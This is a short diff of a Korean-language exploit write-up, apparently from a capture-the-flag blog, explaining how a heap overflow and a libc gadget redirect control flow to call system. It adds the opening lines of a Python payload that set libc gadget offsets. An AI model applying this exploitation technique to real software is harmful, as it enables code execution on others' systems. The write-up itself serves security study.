@@ -51,9 +51,11 @@ mov     rdi, rax
 call    rdx
 ```
 
-어셈블리어로 보면 위와 같다. 위의 분석에 따르면 `rdx, rdi, rax` 모두 `heap` 영역을 가리킨다. 따라서 `heap overflow` 취약점을 이용해서 `mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]` 가젯의 `offset`을 잘 맞춰서 값을 세팅해주면 `rdi`도 변조하고 `system`도 호출할 수 있다.
+어셈블리어로 보면 위와 같다. 위의 분석에 따르면 `rdx, rdi, rax` 모두 `heap` 영역을 가리킨다. 따라서 `heap overflow` 취약점을 이용해서 `mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]` 가젯의 `offset`을 잘 맞춰서 값을 세팅해주면 `rdi`도 변조하고 `system`도 호출할 수 있다. 아래와 같은 `payload`로 익스를 마무리했다.
 
 ```python
+# (전략)
+
 ret = l.address + 0x000000000002882f
 mov_rdi_qword_ptr_rdi_0x10_call_qword_ptr_rax_0x380 = l.address + 0x00000000000984df
 call_qword_ptr_rax_0x18 = l.address + 0x000000000008ac50
